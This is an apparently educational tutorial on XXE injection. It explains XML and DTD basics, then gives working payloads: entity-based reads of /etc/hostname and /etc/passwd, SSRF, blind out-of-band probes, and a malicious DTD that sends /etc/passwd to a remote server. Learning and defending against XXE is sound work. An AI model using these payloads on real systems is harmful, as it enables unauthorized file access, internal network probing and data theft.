# XXE Injection

> **XXE Injection** is a web application security vulnerability which allows malicious attackers to interfere with XML parsing of the web application, typically resulting in the access to the contents of arbitrary files on the system, perform a DOS attack, enumerate internal systems and much more.

XEE Injection arises because of the potential dangerous features that XML parser provides. The features though not needed, might be enabled in the web application, which results in the injection to become successful.

## XML Introduction

XML or _Extensible Markup Language_ is a type of markup language that provides a set of rules for encoding a document that can be read by both humans and machines. The main aspect of XML is to provide ability for inter-communication between machines.

For Example,

```xml
<?xml version="1.0" encoding="UTF-8"?>
  <person>
    <firstname>
      John
    </firstname>
    <lastname>
      Doe
    </lastname>
  </person>
```

The above XML file defines a simple set of data enclosed in opening and closing tags.

### DTD

> Document Type Definition also know as DTD is a set of declarations that define the structure of a XML document.

Example,

```xml
  <?xml version="1.0"?>
  <!DOCTYPE person [
    <!ELEMENT person (firstname, lastname, age)>
    <!ELEMENT firstname (#PCDATA)>
    <!ELEMENT lastname (#PCDATA)>
    <!ELEMENT age (#PCDATA)>
  ]>
  <person>
    <firstname>
      John
    </firstname>
    <lastname>
      Doe
    </lastname>
    <age>
      45
    </age>
  </person>
```

In the above example,

- `!DOCTYPE person` defines that root element should be `person`.
- `!ELEMENT person` defines that `person` element must have `firstname`, `lastname` and `age` as it's children.
- `!ELEMENT firstname` defines that `firstname` should be of `#PCDATA` type.
- `!ELEMENT lastname` defines that `lastname` should be of `#PCDATA` type.
- `!ELEMENT age` defines that `age` should be of `#PCDATA` type.

Following the above DTD rules we have,

```xml
<person>
    <firstname>
      John
    </firstname>
    <lastname>
      Doe
    </lastname>
    <age>
      45
    </age>
 </person>
```

### External DTD

> DTD can be referenced through external files using SYSTEM keyword.

Example,

```xml
<?xml version="1.0"?>
<!DOCTYPE person SYSTEM "person.dtd">
<person>
    <firstname>
      John
    </firstname>
    <lastname>
      Doe
    </lastname>
    <age>
      45
    </age>
 </person>
```

The `SYSTEM` keyword is responsible for external references.
Now `person.dtd` will have,

```xml
  <!ELEMENT person (firstname, lastname, age)>
  <!ELEMENT firstname (#PCDATA)>
  <!ELEMENT lastname (#PCDATA)>
  <!ELEMENT age (#PCDATA)>
```

### XML Custom Entities

XML Custom entities enables to reference a user-defined entity in a DTD.

Example,

```xml
  <!DOCTYPE person [
  <!ELEMENT person (#PCDATA) >
  <!ENTITY name "John Doe">
  ]>
  <person>
    &name;
  </person>
```

The `&name;` would then be replace by `John Doe` because it's a custom entity defined in DTD.

## Exploiting XXE Injection

There are numerous XXE attacks but we will mainly focus few of them.

### Reading Arbitrary files using XXE Injection

To be able to read arbitrary files we need to do two things,

1. Insert or modify an external entity that will reference our arbitrary file.
2. Use the defined _external_ entity in the XML that gets returned with the application's response along with the contents of the arbitrary file.

Let's say you went to an e-commerce website and you found out that their search functionality uses **XML** in their POST data to send search term to the backend.

POST Request sample,

```post
POST /search/ HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/xml
Content-Length: 107
DNT: 1
Connection: close

<?xml version="1.0" encoding="UTF-8"?><term>Cars</term>
```

To retrieve contents of file at `/etc/hostname` we first define an external entity as,

```xml
  <!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/hostname'>]>
```

and then, we use the external entity in the XML that will get returned as response to our request.

```xml
  <term>&xxe;</term>
```

Now our full XEE payload will become,

```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/hostname'>]>
  <term>&xxe;</term>
```

Voila! The response we get is,

```post
HTTP/1.1 400 Bad Request
Content-Type: application/json; charset=utf-8
Connection: close
Content-Length: 1187

No results for "MY_COMPUTER."
```

Enclosed between the quotes is our contents of `/etc/hostname`. Just replace `/etc/hostname` with any file name to retrieve it's contents.

### Performing SSRF using XXE Injection

It is possible to perform **SSRF** using XXE Injection.

In our previous example we used XXE to read contents of file `/ect/hostname` using DTD of,

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/hostname'>]>
```

Now to perform a SSRF using the same entity, we would just replace the URI with an external URL.

```xml
  <!DOCTYPE foo [<!ENTITY xxe SYSTEM 'https://my-website.com'>]>
```

Now our payload becomes,

```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE foo [<!ENTITY xxe SYSTEM 'https://my-website.com'>]>
  <term>&xxe;</term>
```

Now, as a response to the above request, we will receive anything that gets returned from `https://my-website.com`.

#### Impact

This payload can make the vulnerable server work as a proxy for routing web requests. A malicious actor will utilize this proxy to deliver malware and perform nefarious activities.

This will also let the attacker enumerate the internal network that the compromised server has access to.
Not just that, by making the internal server ping our own server we can log the traffic and get additional data regarding the server.
Basically, this is a critical vulnerability and should be fixed immediately.

## Blind XXE Injection

**Blind XXE Injection** is an injection vulnerability where the results of an XXE Injection is not returned in the response, by the application.

The vulnerability is complex as compared to other XXE vulnerabilities.

### Finding Blind XXE Injection using Out-Of-Band techniques

>Out-of-band technique involves the attacker to setup a remote server, that they control and listen for any **intentional network requests** which confirms that the exploit was successful.

Finding **Blind XXE Injection** is similar to **SSRF** using **XXE injection**.

```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE foo [<!ENTITY xxe SYSTEM 'https://my-targetsite.com'> &xxe;]>
```

In the above payload we create a XML external entity whose contents are gathered from our URL. Then, we immediately use the external entity which causes the parser to evaluate the URL by sending a HTTP request.

If the payload was successful we should see a HTTP GET request sent by the webserver.

>In some cases using the regular entities are blocked by the parser in that situation, we could use XML parameter entities.

XML parameter entities are declared using the following syntax,

```xml
<!ENTITY % entity-name "ENTITY VALUE HERE" >
```

`entity-name` is the name of the entity and `ENTITY VALUE HERE` is the value of the entity.

They are reference using `%entity-name` in DTD.

### Using XML Parameter Entity for exploiting using Out-Of-Band

The previous piece of code using XML parameter entity will become,

```xml
  <?xml version="1.0" encoding="UTF-8">
  <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://my-targetsite.com"> %xxe;]>
```

This would also result in a HTTP request from the webserver to `https://my-targetsite.com`.

### Exfiltrate sensitive data using Blind XXE Injection

It is possible to exfiltrate sensitive data through Blind XXE Injection by using a technique we are going to discuss now.

We need to do two things to exfiltrate data using blind XXE injection,

1. First, we need to host a malicious DTD file that will take the *sensitive* file's contents and then, send the contents of the file in a HTTP GET request to our remote server.
2. Second, we need to inject an external XML parameter entity into the vulnerable webserver that will refer to our malicious DTD stored in our site and use it.

The malicious DTD in our site will be,

```xml
  <!ENTITY % file SYSTEM '/etc/passwd'>
  <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://target.site.com/?file=%file;'>">
  %eval;
  %exfiltrate;
```

The DTD will carry out these tasks,

1. Creates a XML **parameter** entity with the name of `file` that contains the contents of file `/etc/passwd`.
2. Creates another XML parameter entity `eval`, that contains *dynamic declaration* of another XML parameter entity called `exfiltrate`. Now, the `exfiltrate` will be evaluated by making a HTTP request to `https://target.site.com/?file=%file;` where `%file;` will be replaced with the contents of `file`, i.e. the contents of `/etc/passwd`.
3. `eval` parameter entity is used, which causes dynamic declaration of `exfiltrate`.
4. At last, `exfiltrate` is used that gets **evaluated** by sending a HTTP request to the server `https://target.site.com/?file=%file;` with the contents of `file` in the HTTP GET request parameter.

The XML external entity that will trigger all these DTD actions must be sent to the vulnerable webserver.

```xml
  <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://target.site.com/malicious.dtd"> %xxe;]>
```

The above external entity will get our malicious DTD available at `https://target.site.com/malicious.dtd` and then, evaluate it because, `xxe` is used in the end.

If all ran successfully we should see a HTTP GET request with the contents of `/etc/passwd` in the request parameter.
